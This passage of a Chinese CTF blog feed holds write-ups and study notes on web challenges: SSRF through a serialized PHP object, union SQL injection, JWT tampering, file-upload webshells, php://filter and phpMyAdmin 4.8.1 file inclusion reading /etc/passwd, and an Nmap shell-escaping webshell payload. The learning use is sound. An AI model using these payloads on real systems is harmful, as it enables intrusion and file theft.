<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到我们传入了三个参数，name，age以及blog而blog会读取我们输入的地址</p>
<p>他的主要工作是建立会话判断一下是不是有效请求，不是就返回404，curl_exec这里是可能存在ssrf漏洞的</p>
<p>可以用ssrf来伪文件读取</p>
<p>可是我们怎么知道flag的文件地址呢</p>
<p>试一下御剑</p>
<p>可以看到flag.php就在文件当中，而之前的报错中可以看到大部分的网页全部都是存储再/var/www/html/中的</p>
<p>我们可以来读一度这里的文件</p>
<p>之前看到我们在之前注入的第四位是data，这个里面包含了博客的网址，如果其中有数就会读取出来</p>
<p>而他又是序列化之后的结果，我们可以更改里面的数据让他读取的文件变成flag.php</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:21:&quot;paixiaoxing.github.io“;&#125;</span><br></pre></td></tr></table></figure>

<p>改成：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>就可以再回显的页面直接读取到flag.php里面的代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>在源代码里面发现了base64加密过的flag</p>
<p>拿到解密文件里面解密一下就可以拿到flag了</p>
<p>后来我回头又看了一下，知道了flag的路径，我们是不是也可以用load_file()这个函数直接读取flag里面的值呢</p>
<p>看一下权限</p>
<p><img src="/2022/01/31/fakebook/12.png" alt="1"></p>
<p>发现居然是root权限那么应该可行</p>
<p><img src="/2022/01/31/fakebook/13.png" alt="1"></p>
<p>发现这样也可以拿到flag</p>
<p>之前的需要base64解码一下</p>
]]></content>
  </entry>
  <entry>
    <title>easy_auth</title>
    <url>/2022/02/06/easy-auth/</url>
    <content><![CDATA[<h1 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h1><p>进去是一个注册登录框：</p>
<p><img src="/2022/02/06/easy-auth/1.png" alt="1"></p>
<p>先注册一个admin看看</p>
<p><img src="/2022/02/06/easy-auth/5.png" alt="1"></p>
<p>可以看到，admin用户是存在的</p>
<p>那么有极大的可能就是第一个就是admin</p>
<p>先随便注册一个进去先看看</p>
<p><img src="/2022/02/06/easy-auth/2.png" alt="1"></p>
<p>进入了这个页面</p>
<p>下面有个对话框可以输入内容</p>
<p>输入完会显示在网页上</p>
<p>抓个包，抓doing包试试</p>
<p><img src="/2022/02/06/easy-auth/3.png" alt="1"></p>
<p>发过来好几个包，最后一个get包里面发现了我们想要的东西，可以看到我们返回了我的ID以及用户名</p>
<p>而且我发过去的东西里面附带了一个token</p>
<p>但是我不知道这视什么解码</p>
<p>上网查了一下这种格式，非常可能是jwt的sha256解码</p>
<p>进去看看</p>
<p><img src="/2022/02/06/easy-auth/9.png" alt="1"></p>
<p>发现确实是我们返回的内容，那么我们按照之前测试的尝试修改UserName改成admin，ID改成0试试第一个是不是admin</p>
<p><img src="/2022/02/06/easy-auth/8.png" alt="1"></p>
<p>好像不太行，但是有返回值，思路应该是对的，ID试试改成1</p>
<p><img src="/2022/02/06/easy-auth/4.png" alt="1"></p>
<p>可以看到他成功返回了并且返回了flag</p>
]]></content>
      <tags>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>你传你🐎呢</title>
    <url>/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/</url>
    <content><![CDATA[<h1 id="做了一下-MRCTF2020-你传你🐎呢"><a href="#做了一下-MRCTF2020-你传你🐎呢" class="headerlink" title="做了一下[MRCTF2020]你传你🐎呢"></a>做了一下[MRCTF2020]你传你🐎呢</h1><p>进去是这样<img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/1.png" alt="1"></p>
<p>发现是一个文件上传漏洞</p>
<p>先上传任意文件试试</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/2.png" alt="2"></p>
<p>发现有问题</p>
<p>测试一下发现只有png格式可以上传</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/3.png" alt="3"></p>
<p>尝试抓包把Content-Type改成image/png将getshell代码变成图片上传</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/4.png" alt="4"></p>
<p>这时候我们可以通过上传htaccess文件将图片变成可执行的代码（我前面的文件上传中有写）</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/5.png" alt="5"></p>
<p>然后用蚂剑链接</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/6.png" alt="6"></p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/7.png" alt="7"></p>
<p>文件无法用cat直接获取翻看一下目录</p>
<p>发现flag在根目录下读取</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/8.png" alt="8"></p>
<p>flag{bfed417c-0c19-4b10-9e6f-4bcc4c1d60de}</p>
]]></content>
      <tags>
        <tag>MRCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>myphpsite</title>
    <url>/2022/01/28/myphpsite/</url>
    <content><![CDATA[<h1 id="My-php-site"><a href="#My-php-site" class="headerlink" title="My php site"></a>My php site</h1><p>拿到题目先看看</p>
<p>发现这是一个php网页</p>
<p>而且网页头以get方式传送了地址</p>
<p><img src="/2022/01/28/myphpsite/1.png" alt="1"></p>
<p>所以想到用伪协议来读取文件地址</p>
<p>尝试一下拿他现在的页面看看能不能读到</p>
<p><img src="/2022/01/28/myphpsite/2.png" alt="2"></p>
<p><img src="/2022/01/28/myphpsite/3.png" alt="2"></p>
<p>拿去解码一下发现可以</p>
<p>接下来尝一下php网页</p>
<p><img src="/2022/01/28/myphpsite/7.png" alt="2"></p>
<p><img src="/2022/01/28/myphpsite/4.png" alt="2"></p>
<p>代码审计一下</p>
<p>发现这个下面给出了flag文件的名字</p>
<p>读取一下</p>
<p><img src="/2022/01/28/myphpsite/8.png" alt="2"></p>
<p>解码一下</p>
<p><img src="/2022/01/28/myphpsite/6.png" alt="2"></p>
<p>得到flag</p>
<p>KCTF{L0C4L_F1L3_1ncLu710n}</p>
]]></content>
      <tags>
        <tag>knightctf</tag>
      </tags>
  </entry>
  <entry>
    <title>序列化</title>
    <url>/2022/01/27/%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="序列化反序列化"><a href="#序列化反序列化" class="headerlink" title="序列化反序列化"></a>序列化反序列化</h1><p>反序列化漏洞专题</p>
<p>代码审计重点：</p>
<p>1、在源代码审计的时候要确认代码逻辑安全性</p>
<p>2、在做在吗审计的时候要确认调用函数的安全性</p>
<h5 id="PASS-1"><a href="#PASS-1" class="headerlink" title="PASS-1"></a>PASS-1</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;Micheal&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> seralize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;demoTest&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Micheal&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;man&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">31</span>;&#125;</span><br><span class="line">O表示一个类</span><br><span class="line">字符类型：名称个数：“名称”;(：如果是类这便是key/value的个数：)</span><br><span class="line">    key：value一组</span><br></pre></td></tr></table></figure>



<p>如果有类的反序列化题目就会先走（自动触发）__destruct（）这个魔法函数</p>
<p>如果OP===2</p>
<p>则把op复制成‘1’</p>
<p>然后把conent的值赋空字符串</p>
<p>然后调用process（）方法函数<img src="/2022/01/27/%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt="1"></p>
<p>如果op==1则调用write方法</p>
<p>如果op==2则调用read（）返回一个res并且输出</p>
<p>如果都不满足则输出 bad hacker！</p>
<p>如果要读取flag肯定调用read（）方法</p>
<p><img src="/2022/01/27/%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt="2"></p>
<p>直接序列化控制其中的变量</p>
<h2 id="漏洞本质："><a href="#漏洞本质：" class="headerlink" title="漏洞本质："></a>漏洞本质：</h2><p>unserialize函数的变量可控</p>
<p>php文件重存在可利用类，类中有魔术方法</p>
<h3 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h3><p>__construct(), __destruct()</p>
<p>__call(),\ __callStatic()</p>
<p>__get(), __set()</p>
<p>__isset(),__unset()</p>
<p>__sleep(), __wakeup()</p>
<p>__toString()</p>
<p>__invoke()</p>
<p>__set_state()</p>
<p>__clone()</p>
<p>__debugInfo()</p>
]]></content>
  </entry>
  <entry>
    <title>我有一个数据库</title>
    <url>/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>首先进去是遗传乱码</p>
<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" alt="1"></p>
<p>应该是编码问题</p>
<p>看了一下robots.txt</p>
<p>里面藏了一个东西</p>
<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" alt="1"></p>
<p>但是里面好像啥也没有</p>
<p>还是扫描一下把</p>
<p>可以看到里面有一个phpmyadmin页面</p>
<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" alt="1"></p>
<p>这里右边直接就给数据库版本服务器版本以及phpadmin版本</p>
<p>找了半天数据库5.5.62也没啥漏洞，最后看了一下phpmyadmin4.8.1有漏洞</p>
<p>去网上直接用就行了</p>
<p>简单来说就是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">一个文件包含漏洞</span><br><span class="line">他必须传入target参数</span><br><span class="line">在后面添加?进行截断</span><br><span class="line">’$target=db_sql.php?/../../被包含文件’</span><br><span class="line">就可以读取到文件</span><br><span class="line">但是windows文件不能用特殊字符可以经过两次编码</span><br><span class="line">这样在最后一个判断的时候就可以判断为db_sql.php符合条件就可以文件包含</span><br></pre></td></tr></table></figure>

<p>直接用他们的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../../../etc/passwd </span><br><span class="line">他会包含这个文件，其中target值会被解析成db_sql.php%3f/../../test.txt，因为php会把前面db_sql.php%3f当成目录</span><br><span class="line">所以要多加一个../来跳出此目录，执行后面语句。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" alt="1"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../../../flag </span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" alt="1"></p>
<p>拿到flag</p>
]]></content>
      <tags>
        <tag>GWCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>%00截断</p>
<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>%00阻断</p>
<p>php://filter/read=convert.base64-encode/resource=</p>
<h3 id="文件包含-挖掘经验"><a href="#文件包含-挖掘经验" class="headerlink" title="文件包含-挖掘经验"></a>文件包含-挖掘经验</h3><p>• 模块加载、cache调用，传入的参数拼接包含路径</p>
<p>• include()</p>
<p>使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p>
<p>• inclue_once()</p>
<p>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
<p>• require()</p>
<p>使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并</p>
<p>立即终止程序。</p>
<p>• require_once()</p>
<p>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
<p>了解常见的文件包含点</p>
<p>会基本利用文件包含点，包括伪协议等</p>
<p>查看服务器 apche或者nginx（/var/log/nginx/access.log）</p>
<p>找到它默认的服务器日志存放位置</p>
<p>读文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" alt="1"></p>
<p>被包含的文件如果含有&lt;?php &lt;? 等php投，里面的php代码就会被执行</p>
<p>require或者include</p>
<p>常见可在服务器上生成文件的功能</p>
<p>1、文件上传</p>
<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png" alt="2"></p>
<p>file=***则存在文件包含漏洞</p>
<p>2、服务器日志目录一般在（/var/log/apache2/assess.logAPACHE协议）<em><strong>用post请求发送，来源用referer</strong></em></p>
<p>3、程序本身自带备份功能（MyWebSQL）</p>
<p>php://filter=伪协议</p>
<p>/?file=php://filter/read=convert.base64-encode/resource=xxx.php</p>
<h2 id="文件读取-挖掘经验"><a href="#文件读取-挖掘经验" class="headerlink" title="文件读取-挖掘经验"></a>文件读取-挖掘经验</h2><h4 id="load-file-函数"><a href="#load-file-函数" class="headerlink" title="load_file()函数"></a>load_file()函数</h4><p>1、必须有权限读取并且文件必须完全刻度</p>
<p>2、想要读取的文件必须再服务器上</p>
<p>3、必须指定文件完整的路劲</p>
<p>4、想要读文件必须小于max_allowed_packet</p>
<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png" alt="3"></p>
<p>• fopen()</p>
<p>• file_get_contents()</p>
<p>• fread</p>
<p>• fgets</p>
<p>• fgetss</p>
<p>• file</p>
<p>• fpassthru</p>
<p>• parse_ini_file</p>
<p>• readfile</p>
<p> allow_url_fopen选项激活了 URL 形式的 fopen 封装协议</p>
<p>使得可以访问 URL 对象例如文件。默认的封装协议提供用</p>
<p>ftp 和 http 协议来访问远程文件，一些扩展库例如 zlib 可</p>
<p>能会注册更多的封装协议</p>
<h2 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h2><p>unlink（）</p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png" alt="4"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> extract ( <span class="variable">$array</span> , extract_rules,prefix ) </span><br><span class="line">    </span><br><span class="line">•<span class="variable">$array</span> 关联的数组，受第二个和第三个参数的影响。 </span><br><span class="line">•extract_rules 对待非法／数字和冲突的键名的方法将根据取出标记</span><br><span class="line">•prefix 仅在第二个参数特殊时需要，添加前缀</span><br><span class="line"><span class="comment"># extract（）变量覆盖</span></span><br></pre></td></tr></table></figure>

<h4 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="**parse_str()**变量覆盖"></a>**parse_str()**变量覆盖</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> parse_str ( <span class="keyword">string</span> <span class="variable">$encoded_string</span> [, <span class="keyword">array</span> &amp;<span class="variable">$result</span> ] )</span><br><span class="line"><span class="comment"># $encoded_string 输入的字符串</span></span><br><span class="line"><span class="comment"># $result 变量将会以数组元素的形式存入到这个数组，作为替代</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">import_request_variables()</span><br><span class="line">    (PHP <span class="number">4</span> &gt;= <span class="number">4.1</span>.<span class="number">0</span>, PHP <span class="number">5</span> &lt; <span class="number">5.4</span>.<span class="number">0</span>)</span><br><span class="line">import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</span><br><span class="line"><span class="keyword">bool</span> import_request_variables ( <span class="keyword">string</span> <span class="variable">$types</span> [, <span class="keyword">string</span> <span class="variable">$prefix</span> ] )</span><br><span class="line"><span class="comment"># $type 指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie</span></span><br><span class="line"><span class="comment"># $prefix 变量名前缀</span></span><br></pre></td></tr></table></figure>



<h3 id="危险函数："><a href="#危险函数：" class="headerlink" title="危险函数："></a>危险函数：</h3><p>•<strong>EXTR_OVERWRITE</strong> - 默认。如果有冲突，则覆盖已有的变量。</p>
<p>•EXTR_SKIP - 如果有冲突，不覆盖已有的变量。（忽略数组中同名的元素）</p>
<p><strong>•EXTR_PREFIX_SAME</strong> - 如果有冲突，在变量名前加上前缀 prefix。自 PHP 4.0.5 起，这也包括了对数字</p>
<p>索引的处理</p>
<p>•EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix（第三个参数）</p>
<p>•EXTR_PREFIX_INVALID - 仅在非法或数字变量名前加上前缀 prefix。本标记是 PHP 4.0.5 新加的。</p>
<p>•<strong>EXTR_IF_EXISTS</strong> - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。可以用在已经</p>
<p>定义了一组合法的变量，然后要从一个数组例如 $_REQUEST 中提取值覆盖这些变量的场合。本标记是 PH</p>
<p>P 4.2.0 新加的。</p>
<p>•EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不</p>
<p>处理。本标记是 PHP 4.2.0 新加的。</p>
<p>•EXTR_REFS - 将变量作为引用提取。这有力地表明了导入的变量仍然引用了 var_array 参数的值。可以</p>
<p>单独使用这个标志或者在 extract_type 中用 OR 与其它任何标志结合使用。本标记是 PHP 4.3.0 新加</p>
<p>的。</p>
]]></content>
  </entry>
  <entry>
    <title>网鼎杯-朱雀组-Nmap</title>
    <url>/2022/03/02/%E6%9C%B1%E9%9B%80%E6%9D%AF-Nmap/</url>
    <content><![CDATA[<h1 id="网鼎杯-朱雀组Nmap"><a href="#网鼎杯-朱雀组Nmap" class="headerlink" title="[网鼎杯]朱雀组Nmap"></a>[网鼎杯]朱雀组Nmap</h1><p>看到题目，想到了上次做到的OnlineTool</p>
<p>一样都是用到了Nmap这个脚本</p>
<p>翻到nmap中有一个-oG参数将命令参数写入自己定义的文件中</p>
<p>而且这里考到了escapeshellarg和escapeshellcmd一起使用的时候会造成单引号逃逸</p>
<p>escapeshellarg，会在字符串中所有的单引号（包括成对存在闭合的）前添加一个’’ ，若已经用\转义，则会用并且用’’ 替换\，最后将整个变量用单引号包裹。<br>escapeshellcmd，会将字符串中未被转义的双引号或单引号转义（成对存在闭合的双引号或单引号除外）若已被转义，则用&quot;或\‘替”或’<br>但是先进行larg再进行cmd的时候因为前面先转义单引号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x27; -v -d a=1</span><br></pre></td></tr></table></figure>

<p>经过escapeshellarg进行单引号转义,再用单引号包裹连接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br></pre></td></tr></table></figure>

<p>在进行escapeshellcmd转义对后面的单引号还有\进行转义</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;</span><br></pre></td></tr></table></figure>

<p>现在可以看到后面的参数是没有被包裹的这里面的\直接被变成了一个\，也就是说这个指令被分割成三个部分</p>
<p>127.0.0.1    ’ ’ 还有a =1&#39;</p>
<p>如果此时是进行curl指令那么就变成</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 127.0.0.1 -v -d a=1&#x27;</span><br></pre></td></tr></table></figure>

<p>也就是以post方式传入a=1‘最终逃逸单引号</p>
<p>尝试一下上次构造的payload</p>
<p><code> &#39; &lt;?php @eval($_POST[&quot;a&quot;]）;?&gt; -oG hack.php&#39;</code></p>
<p><img src="/2022/03/02/%E6%9C%B1%E9%9B%80%E6%9D%AF-Nmap/1.png" alt="1"></p>
<p>可以看到，被拦截了</p>
<p>但是代码是正确执行了，只是需要绕一下过滤</p>
<p>测试了一下，是因为过滤了php</p>
<p>那么我们直接&lt;?php替换成&lt;?=可以直接运行，然后把php文件转换成phtml文件，直接读取文件</p>
<p><img src="/2022/03/02/%E6%9C%B1%E9%9B%80%E6%9D%AF-Nmap/2.png" alt="1"></p>
<p>发现可以执行命令，那么直接执行cat /flag直接拿到flag</p>
]]></content>
      <tags>
        <tag>网鼎杯</tag>
      </tags>
  </entry>
  <entry>
    <title>朴实无华</title>
    <url>/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
    <content><![CDATA[<h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><p>小刷一下。</p>
<p>进入题目发现</p>
<p><img src="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/1.png" alt="1"></p>
<p>网页啥也没有，让我们黑他，但是这个标题上面是一串乱码，但是结尾有个很明显的bot</p>
<p>猜测页面含有一个机器人</p>
<p>访问robots.txt发现</p>
<p><img src="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/2.png" alt="1"></p>
<p>果然给出了提示，说是虚假的flag存在这个文件中</p>
<p>进去看看</p>
<p><img src="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/3.png" alt="1"></p>
<p>给了一个虚假的flag，抱着开玩笑的心态提交了一下，哈哈当然不行，在标头的地方找到了另一个提示</p>
<p>继续访问页面</p>
<p><img src="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/4.png" alt="1"></p>
<p>我终于直到为什么叫朴实无华了</p>
<p>但是都是一串乱码，去网上找了正常的题目：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span 